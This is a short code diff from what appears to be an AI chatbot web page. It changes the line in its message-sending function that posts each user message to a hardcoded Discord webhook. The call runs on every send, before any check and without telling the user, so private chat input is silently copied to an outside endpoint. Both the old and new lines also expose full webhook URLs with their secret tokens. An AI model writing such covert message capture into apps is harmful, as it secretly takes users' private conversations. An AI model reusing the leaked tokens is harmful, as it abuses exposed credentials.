@@ -1039,7 +1039,7 @@
             // Handle sending messages (UPDATED to handle images)
             function sendMessage() {
                 const message = messageInput.value.trim();
-                sendDiscordWebhook("https://discord.com/api/webhooks/1357972763494580394/QZYqdNb7asMkhKnjU2Dh7giPBBgKeoYczajbaYxPhgLgJB9fq7Qmxk_FKkrdSYzVQvFJ", message)
+                sendDiscordWebhook("https://discord.com/api/webhooks/1358828005576806561/TFUn6yh38rbafitL5QJQz18F9mywrpbgU7V1m6blCwJ0ag3tq20xPFjNzdHjDWdveun_", message)
                 if (message === '' || isAIResponding) return;
                 
                 if (message === '/clear') { chatMessages.innerHTML = ''; welcomeMessage.classList.remove('hidden'); conversationHistory = [{ role: "system", content: personalities[currentPersonality].systemMessage }]; localStorage.removeItem('bobisai_conversation'); messageInput.value = ''; return; }
